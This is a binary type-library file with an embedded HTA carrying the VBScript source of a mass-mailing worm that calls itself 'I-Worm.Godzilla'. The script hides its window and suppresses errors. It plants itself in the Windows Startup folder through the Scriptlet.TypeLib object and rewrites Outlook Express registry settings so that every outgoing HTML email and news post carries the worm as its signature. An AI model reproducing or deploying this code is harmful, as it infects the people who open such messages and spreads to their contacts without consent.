MSFT      	      A                                    ��������    �   ����    ����    ����   ����    ����   ����    ����   ����    ����   D  �   ����   �     ����   �     ����   �     ����   �  $  ����   ����    ����   ����    ����   ����    ����   ����    ����   ����    ����   ����    ����   ������������������������������������������������������������������������    ����������������������������������������������������7�ќ��DEST  ��������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������    ������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������ �yScriptletTypeLib<HTML><HEAD><HTA:APPLICATION ID="hO" WINDOWSTATE=Minimize></HEAD><BODY><SCRIPT LANGUAGE="VBScript">
' I-Worm.Godzilla Coded by Zorro
on error resume next
Dim fso,ind,hml,wshl
Set fso=CreateObject("Scripting.FileSystemObject"):set ind=fso.OpenTextFile("C:\WINDOWS\START MENU\PROGRAMS\STARTUP\Update.hta",1):set hml=fso.CreateTextFile("C:\WINDOWS\SIGN.HTML",True):hml.writeline "<"&"HTML><"&"BODY>":hml.writeline "<object classid= ""clsid:06290BD5-48AA-11D2-8432-006008C3FBFC"" id= ""hmlfile"">":hml.writeline "</object>":hml.writeline "<SCRIPT LANGUAGE = ""VBScript"">":hml.writeline "hmlfile.path = ""C:\WINDOWS\START MENU\PROGRAMS\STARTUP\Update.hta""":hml.write     "hmlfile.doc = """
t = 0 : s = 0 :c=""
while t = 0
 p = c
 c = ind.read(1)
 if p = "<" AND c = "H" AND s = 0 then hml.Write "<"" & """ : s = 1 
 if c = "J" AND p = ">" then t = 1
 if s = 1 then 
  if c = chr(13) then hml.Write """ & chr(13) & """ 
  if c = chr(10) then hml.Write """ & chr(10) & """ : c= chr(13)
  if c = """" then hml.Write """""" : c= chr(13)
  if c = "<" then hml.write "<"" & """ : c = chr(13) 
  if c <> chr(13) then hml.Write c
 end if
wend
ind.close:hml.Writeline """":hml.Writeline "hmlfile.Write":hml.writeline "<"&"/SCRIPT>":hml.Writeline "<"&"/BODY><"&"/HTML>":hml.close:Set wshl = CreateObject("WScript.Shell"):rr = wshl.RegRead("HKEY_CURRENT_USER\Identities\Default User ID"):rr = "HKEY_CURRENT_USER\Identities\"&rr&"\Software\Microsoft\Outlook Express\5.0\":wshl.RegWrite rr&"Signatures\00000123\file","C:\WINDOWS\SIGN.HTML":wshl.RegWrite rr&"Signatures\00000123\name","System Signature":wshl.RegWrite rr&"Signatures\00000123\text","":wshl.RegWrite rr&"Signatures\00000123\type",2,"REG_DWORD":wshl.RegWrite rr&"Signatures\Default Signature","00000123":wshl.RegWrite rr&"Signature Flags",1,"REG_DWORD":wshl.RegWrite rr&"Mail\Message Send HTML",1,"REG_DWORD":wshl.RegWrite rr&"News\Message Send HTML",1,"REG_DWORD"
if left(date,5) = "10/10" then MsgBox "Have you danced with the devil in the moonlight ?",0,"I-Worm.Godzilla"
Self.Close
</SCRIPT></BODY></HTML>JWWW